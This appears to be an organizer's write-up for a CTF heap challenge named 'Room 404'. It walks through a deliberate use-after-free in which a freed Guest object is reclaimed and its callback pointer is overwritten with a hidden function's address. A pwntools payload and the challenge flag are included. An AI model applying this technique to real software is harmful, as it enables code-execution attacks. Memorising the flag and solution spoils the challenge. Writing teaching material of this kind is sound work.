@@ -1,0 +1,356 @@
+IITCTF — ROOM 404 WRITEUP
+==========================
+
+FLAG
+----
+IITCTF{h1lb3rt_f0und_r00m_404}
+
+
+1. RECONNAISSANCE
+-----------------
+
+Run:
+
+    ./room_404
+
+The program provides:
+
+    1. Check in guest
+    2. View room
+    3. Check out guest
+    4. Submit reservation packet
+    5. Trigger checkout handler
+    6. Leave hotel
+
+The challenge is not solved by simply entering room 404. The important
+behavior is in the lifetime of the heap-allocated Guest object.
+
+
+2. FIND THE GUEST STRUCTURE
+---------------------------
+
+Open `room_404` in Ghidra.
+
+The important structure is conceptually:
+
+    struct Guest {
+        char name[32];
+        unsigned long room;
+        checkout_cb checkout;
+    };
+
+On this 64-bit build:
+
+    name       -> offset 0x00
+    room       -> offset 0x20
+    checkout   -> offset 0x28
+
+The last field is a function pointer.
+
+The normal callback is:
+
+    normal_checkout
+
+The hidden target is:
+
+    room_404
+
+
+3. FIND THE USE-AFTER-FREE
+--------------------------
+
+Inspect `check_out()`.
+
+The program executes:
+
+    free(guests[slot]);
+
+but deliberately does NOT execute:
+
+    guests[slot] = NULL;
+
+Therefore the array still contains a pointer to freed memory.
+
+This creates a dangling-pointer / use-after-free primitive.
+
+Conceptually:
+
+    guests[slot]
+         |
+         v
+    freed Guest chunk
+
+
+4. FIND THE SAME-SIZE ALLOCATION
+--------------------------------
+
+Inspect `reservation_packet()`.
+
+It allocates:
+
+    malloc(sizeof(Guest))
+
+This is exactly the same size as the Guest structure.
+
+After checking out a guest, the next same-size malloc can reclaim the
+freed chunk.
+
+Conceptually:
+
+    Guest allocation
+          |
+          v
+       free()
+          |
+          v
+    freed heap chunk
+          |
+          v
+    reservation_packet()
+          |
+          v
+    same chunk reused
+
+
+5. UNDERSTAND THE FUNCTION POINTER
+----------------------------------
+
+The Guest layout is:
+
+    0x00 - 0x1f    name[32]
+    0x20 - 0x27    room
+    0x28 - 0x2f    checkout function pointer
+
+The reservation packet parser lets the player supply raw hexadecimal
+bytes for the whole 48-byte object.
+
+Therefore the final eight bytes can be replaced with the address of
+`room_404`.
+
+
+6. FIND room_404()
+------------------
+
+In Ghidra, locate the hidden `room_404()` function.
+
+Alternatively:
+
+    nm -n room_404 | grep room_404
+
+For the supplied build, the address is expected to be:
+
+    0x4011e8
+
+The exact address should always be taken from the binary being tested,
+rather than hardcoded from the writeup.
+
+
+7. BUILD THE EXPLOIT
+--------------------
+
+First check in a guest in slot 0.
+
+Example:
+
+    Choice: 1
+    Guest slot: 0
+    Guest name: alice
+    Room number: 12
+
+Then check it out:
+
+    Choice: 3
+    Guest slot: 0
+
+The program says:
+
+    [!] Reservation pointer retained for archival purposes.
+
+This is the dangling pointer.
+
+
+8. RECLAIM THE FREED CHUNK
+--------------------------
+
+Select:
+
+    Choice: 4
+
+and use slot 0.
+
+The reservation packet is 48 bytes:
+
+    32 bytes padding
+     8 bytes room value
+     8 bytes room_404 address
+
+A pwntools-style payload can be generated with:
+
+    from pwn import *
+
+    elf = ELF("./room_404")
+    win = elf.symbols["room_404"]
+
+    payload  = b"A" * 32
+    payload += p64(404)
+    payload += p64(win)
+
+The challenge's reservation interface expects those bytes represented
+as hexadecimal values separated by spaces.
+
+
+9. TRIGGER THE CALLBACK
+-----------------------
+
+Finally choose:
+
+    Choice: 5
+    Guest slot: 0
+
+The program executes:
+
+    guests[slot]->checkout(guests[slot]);
+
+But the stale pointer now refers to the reclaimed reservation packet.
+
+Its callback field has been replaced with the address of:
+
+    room_404
+
+Therefore execution is redirected to the hidden function.
+
+
+10. FINAL RESULT
+----------------
+
+The program reaches:
+
+    room_404()
+
+and prints:
+
+    IITCTF{h1lb3rt_f0und_r00m_404}
+
+
+11. COMPLETE EXPLOIT PATH
+-------------------------
+
+    Check in Guest
+          |
+          v
+    Check out Guest
+          |
+          v
+    guests[slot] becomes dangling
+          |
+          v
+    Submit reservation packet
+          |
+          v
+    malloc(sizeof(Guest))
+          |
+          v
+    Freed chunk is reclaimed
+          |
+          v
+    Overwrite callback
+          |
+          v
+    Trigger checkout handler
+          |
+          v
+    room_404()
+          |
+          v
+    FLAG
+
+
+12. WHY THE INFINITE HOTEL THEME MATTERS
+----------------------------------------
+
+The challenge is inspired by Hilbert's Hotel.
+
+The mathematical idea is that an infinite hotel can be completely
+occupied and still accommodate another guest by moving the existing
+guests.
+
+The challenge translates that idea into memory reuse:
+
+    old Guest object
+          |
+          v
+       checkout
+          |
+          v
+    memory becomes reusable
+          |
+          v
+    new reservation packet
+          |
+          v
+    same heap memory is reused
+
+The "one more guest" concept is therefore connected to the actual
+heap behavior rather than being purely cosmetic.
+
+
+13. WHY THE FLAG IS NOT A STRING
+-------------------------------
+
+The flag is not stored as plaintext.
+
+The hidden `room_404()` function contains an encoded byte array.
+Each byte is decoded at runtime using XOR with 0x5A.
+
+Therefore:
+
+    strings room_404 | grep IITCTF
+
+should produce no flag.
+
+The flag only appears after the player successfully redirects
+execution to `room_404()`.
+
+
+14. ORGANIZER BUILD
+-------------------
+
+    chmod +x build.sh
+    ./build.sh
+
+Player-facing file:
+
+    room_404
+
+Do not distribute:
+
+    room_404.c
+    build.sh
+    writeup.txt
+
+
+15. DEPLOYMENT
+--------------
+
+This is a local downloadable Pwn challenge.
+
+No nc service is required.
+
+Distribute only:
+
+    room_404
+
+
+16. FINAL TESTING CHECKLIST
+---------------------------
+
+    [ ] Binary starts normally.
+    [ ] Check-in works.
+    [ ] Check-out works.
+    [ ] Dangling pointer remains.
+    [ ] Reservation packet reclaims the freed chunk.
+    [ ] room_404 address can be found.
+    [ ] Callback overwrite reaches room_404.
+    [ ] Flag is printed after exploitation.
+    [ ] `strings room_404 | grep IITCTF` returns nothing.
+    [ ] Source/writeup are removed from the player package.
